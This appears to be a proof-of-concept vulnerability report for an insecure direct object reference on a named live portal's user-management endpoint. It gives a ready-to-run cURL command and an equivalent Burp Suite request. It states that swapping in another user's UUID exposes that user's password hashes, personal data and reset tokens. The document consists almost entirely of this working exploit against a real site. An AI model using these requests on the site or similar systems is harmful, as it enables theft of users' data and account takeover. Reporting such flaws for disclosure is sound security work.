# Description
This request exploits an IDOR vulnerability on the /user-management/user/{id} endpoint by substituting the UUID c99ff294-ee92-42de-8a45-a9860ace32cd with any target user's UUID, allowing an unprivileged user to extract another user's full profile including bcrypt password hashes, roles, PII, and password reset tokens — enabling offline password cracking and account takeover.


# cURL command

curl -i -s -X GET "https://portal.skillab-project.eu/user-management/user/[TARGETED_USER_UUID]" \
  -H "Host: portal.skillab-project.eu" \
  -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0" \
  -H "Accept: application/json, text/plain, */*" \
  -H "Accept-Language: en-US,en;q=0.5" \
  -H "Authorization: Bearer [AUTHENTICATED_USER_JWT]" \
  -H "Referer: https://portal.skillab-project.eu/citizen/account" \
  -H "Sec-Fetch-Dest: empty" \
  -H "Sec-Fetch-Mode: cors" \
  -H "Sec-Fetch-Site: same-origin" \
  -H "Connection: keep-alive" \
  --compressed


# Burp Suite Request

GET /user-management/user/[TARGETED_USER_UUID] HTTP/1.1
Host: portal.skillab-project.eu
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Bearer [AUTHENTICATED_USER_JWT]
Referer: https://portal.skillab-project.eu/citizen/account
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: keep-alive

